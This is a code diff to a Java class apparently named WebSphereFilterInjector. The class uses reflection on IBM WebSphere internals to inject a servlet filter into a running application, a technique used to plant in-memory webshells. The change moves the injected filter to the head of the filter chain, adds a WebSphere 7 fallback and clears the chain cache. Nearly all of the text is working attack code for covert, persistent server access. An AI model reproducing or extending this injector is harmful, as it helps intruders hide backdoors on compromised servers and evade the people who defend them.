@@ -8,6 +8,7 @@ import java.lang.reflect.Constructor;
 import java.lang.reflect.Field;
 import java.lang.reflect.Method;
 import java.util.HashSet;
+import java.util.List;
 import java.util.Set;
 import java.util.zip.GZIPInputStream;
 
@@ -168,6 +169,17 @@ public class WebSphereFilterInjector {
         invokeMethod(filterManager, "addFilterMapping", new Class[]{filterMappingClass}, new Object[]{filterMapping});
         invokeMethod(webAppConfig, "addFilterInfo", new Class[]{iFilterConfigClass}, new Object[]{filterConfig});
 
+        try {
+            List uriFilterMappingInfos = (List) getFieldValue(webAppConfig, "uriFilterMappingInfos");
+            uriFilterMappingInfos.remove(filterMapping);
+            uriFilterMappingInfos.add(0, filterMapping);
+        } catch (Exception e) {
+            // WebSphere7
+            List uriFilterMappings = (List) getFieldValue(filterManager, "_uriFilterMappings");
+            Object fmInfo = uriFilterMappings.remove(uriFilterMappings.size() - 1);
+            uriFilterMappings.add(0, fmInfo);
+        }
+
         // 清除缓存
         Object chainCache = getFieldValue(filterManager, "chainCache");
         try {
@@ -274,13 +286,9 @@ public class WebSphereFilterInjector {
 
     @SuppressWarnings("all")
     public static Object getFieldValue(Object obj, String name) throws NoSuchFieldException, IllegalAccessException {
-        try {
-            Field field = getField(obj, name);
-            field.setAccessible(true);
-            return field.get(obj);
-        } catch (NoSuchFieldException ignored) {
-        }
-        return null;
+        Field field = getField(obj, name);
+        field.setAccessible(true);
+        return field.get(obj);
     }
 
     @SuppressWarnings("all")
